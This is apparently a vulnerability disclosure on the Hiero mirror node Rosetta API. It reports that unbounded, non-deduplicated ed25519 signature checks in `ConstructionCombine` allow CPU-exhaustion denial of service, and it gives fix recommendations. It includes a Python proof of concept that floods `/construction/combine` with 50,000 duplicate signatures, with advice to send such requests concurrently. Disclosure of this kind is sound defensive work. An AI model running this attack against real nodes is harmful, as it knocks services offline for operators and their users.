### Title
Unbounded Duplicate Signature Processing in `ConstructionCombine` Enables CPU Exhaustion DoS

### Summary
The `ConstructionCombine` function in `rosetta/app/services/construction_service.go` iterates over all entries in `request.Signatures` without any deduplication or count limit, calling the CPU-intensive `ed25519.Verify()` and `hiero.TransactionAddSignature()` for every entry including exact duplicates. An unprivileged attacker can craft a single request containing thousands of identical valid signatures, consuming CPU proportional to the duplicate count and driving node resource consumption well above 30% with minimal effort.

### Finding Description

**Exact code location:** `rosetta/app/services/construction_service.go`, `ConstructionCombine()`, lines 58–87.

```go
// Line 58: only check is non-empty; no upper bound
if len(request.Signatures) == 0 {
    return nil, errors.ErrNoSignature
}
// ...
// Lines 72-87: unbounded loop, no deduplication
for _, signature := range request.Signatures {
    if signature.SignatureType != rTypes.Ed25519 {
        return nil, errors.ErrInvalidSignatureType
    }
    pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
    if err != nil {
        return nil, errors.ErrInvalidPublicKey
    }
    if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {
        return nil, errors.ErrInvalidSignatureVerification
    }
    _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
}
``` [1](#0-0) [2](#0-1) 

**Root cause:** The only guard on `request.Signatures` is the `len == 0` check at line 58. There is no maximum count, no deduplication by `(publicKey, signatureBytes)` pair, and no per-request work budget. `ed25519.Verify()` is a pure-CPU elliptic-curve operation (~50–100 µs per call on modern hardware). Sending N identical entries causes N full verifications.

**Failed assumption:** The code assumes callers supply a small, deduplicated set of signers (one per required account). Nothing in the protocol or application enforces this.

**Exploit flow:**
1. Attacker calls `/construction/payloads` (no auth required) to obtain a valid `UnsignedTransaction` hex string and the `frozenBodyBytes` signing payload.
2. Attacker generates a single ed25519 key pair locally and signs `frozenBodyBytes` once, producing one valid `(pubKey, sigBytes)` pair.
3. Attacker constructs a `ConstructionCombineRequest` with `UnsignedTransaction` set to the value from step 1 and `Signatures` containing N copies of the same `(pubKey, sigBytes)` entry (e.g., N = 50,000).
4. Server processes the request: `ed25519.Verify()` is called 50,000 times (~2.5–5 seconds of CPU on one core), then `hiero.TransactionAddSignature()` 50,000 times.
5. Attacker sends multiple such requests concurrently.

**Why existing checks fail:**

- *Application level:* No signature count cap, no deduplication map, no `http.MaxBytesReader`. The `http.Server` in `main.go` sets only `ReadTimeout`/`WriteTimeout` — no body size limit. [3](#0-2) 
- *Infrastructure level (Traefik):* The optional Kubernetes Helm chart configures `inFlightReq: amount: 5` per IP and `rateLimit: average: 10` per *host* (not per IP). [4](#0-3)  These controls are not enforced at the application layer, are absent in bare-metal/direct deployments, and even when present, 5 concurrent requests × 50,000 signatures × ~100 µs = ~25 CPU-seconds consumed per second — far exceeding a single core.
- *Offline mode:* `ConstructionCombine` does not call `c.IsOnline()`, so the attack works in both online and offline deployments. [5](#0-4) 

### Impact Explanation

A single HTTP request with 50,000 duplicate signatures consumes ~2.5–5 seconds of CPU on one core. With 5 concurrent requests (even under Traefik's limit), the server's CPU is saturated, causing legitimate requests to queue or time out. This constitutes a denial-of-service against the Rosetta mirror node, directly satisfying the ">30% resource increase" threshold. The endpoint is stateless and requires no database interaction, so the attack is cheap for the attacker and expensive for the server.

### Likelihood Explanation

The attack requires zero privileges: the attacker only needs network access to the Rosetta HTTP port and the ability to generate a local ed25519 key pair (trivial with any standard crypto library). The `ConstructionCombineRequest` is a standard JSON POST body; crafting it with 50,000 duplicate signature entries is a one-time script. The attack is fully repeatable and automatable. No authentication, no tokens, no prior account state is needed.

### Recommendation

Apply all of the following in `ConstructionCombine`:

1. **Hard cap on signature count:** Reject requests where `len(request.Signatures)` exceeds the maximum number of required signers for any supported transaction type (e.g., 2–3).
2. **Deduplication before the loop:** Build a `map[string]struct{}` keyed on `hex(pubKey)+":"+hex(sigBytes)` and skip (or error on) duplicates before calling `ed25519.Verify()`.
3. **Application-level body size limit:** Wrap the HTTP handler with `http.MaxBytesReader` to cap request body size (e.g., 64 KB).
4. **Make Traefik middleware mandatory:** Document and enforce the `inFlightReq` and `rateLimit` middleware as required, not optional, for all deployment modes.

### Proof of Concept

```python
import requests, json
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

BASE = "http://<rosetta-host>:<port>"
NETWORK = {"blockchain": "Hiero", "network": "testnet"}

# Step 1: get unsigned transaction + body bytes via /construction/payloads
# (omitted for brevity; use any valid payloads request)
unsigned_tx_hex = "<hex from /construction/payloads>"
body_bytes = bytes.fromhex("<frozenBodyBytes hex from payloads response>")

# Step 2: generate key pair and sign once
priv = Ed25519PrivateKey.generate()
pub  = priv.public_key()
pub_bytes = pub.public_bytes_raw()   # 32 bytes
sig_bytes  = priv.sign(body_bytes)   # 64 bytes

# Step 3: build request with 50,000 duplicate signatures
sig_entry = {
    "signing_payload": {"hex_bytes": body_bytes.hex(), "signature_type": "ed25519"},
    "public_key": {"hex_bytes": pub_bytes.hex(), "curve_type": "edwards25519"},
    "signature_type": "ed25519",
    "hex_bytes": sig_bytes.hex()
}
payload = {
    "network_identifier": NETWORK,
    "unsigned_transaction": unsigned_tx_hex,
    "signatures": [sig_entry] * 50_000   # 50,000 duplicates
}

# Step 4: send (repeat concurrently for amplification)
r = requests.post(f"{BASE}/construction/combine", json=payload, timeout=120)
print(r.status_code, r.elapsed.total_seconds())
# Expected: server spends several CPU-seconds processing ed25519.Verify() 50,000 times
```

### Citations

**File:** rosetta/app/services/construction_service.go (L54-97)
```go
func (c *constructionAPIService) ConstructionCombine(
	_ context.Context,
	request *rTypes.ConstructionCombineRequest,
) (*rTypes.ConstructionCombineResponse, *rTypes.Error) {
	if len(request.Signatures) == 0 {
		return nil, errors.ErrNoSignature
	}

	transaction, rErr := unmarshallTransactionFromHexString(request.UnsignedTransaction)
	if rErr != nil {
		return nil, rErr
	}

	frozenBodyBytes, rErr := getFrozenTransactionBodyBytes(transaction)
	if rErr != nil {
		return nil, rErr
	}

	for _, signature := range request.Signatures {
		if signature.SignatureType != rTypes.Ed25519 {
			return nil, errors.ErrInvalidSignatureType
		}

		pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
		if err != nil {
			return nil, errors.ErrInvalidPublicKey
		}

		if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {
			return nil, errors.ErrInvalidSignatureVerification
		}

		_, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
	}

	transactionBytes, err := hiero.TransactionToBytes(transaction)
	if err != nil {
		return nil, errors.ErrTransactionMarshallingFailed
	}

	return &rTypes.ConstructionCombineResponse{
		SignedTransaction: tools.SafeAddHexPrefix(hex.EncodeToString(transactionBytes)),
	}, nil
}
```

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
